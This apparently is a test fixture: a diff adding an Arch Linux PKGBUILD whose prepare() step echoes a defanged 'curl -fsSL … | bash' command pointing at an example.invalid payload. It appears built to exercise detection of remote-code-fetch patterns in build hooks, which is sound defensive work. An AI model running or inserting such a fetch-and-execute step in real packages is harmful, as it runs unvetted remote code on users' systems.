@@ -1,0 +1,14 @@
+# Maintainer: Fixture Maintainer <fixture@example.invalid>
+pkgname=curated-curl-pipe-shell
+pkgver=1.0
+pkgrel=1
+pkgdesc="Defanged curl pipe shell fixture"
+arch=("x86_64")
+url="https://example.invalid/curated-curl-pipe-shell"
+license=("MIT")
+source=("https://example.invalid/curated-curl-pipe-shell-1.0.tar.gz")
+sha256sums=("cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc")
+
+prepare() {
+  echo "defanged static pattern: curl -fsSL https://example.invalid/defanged-payload.sh | bash"
+}
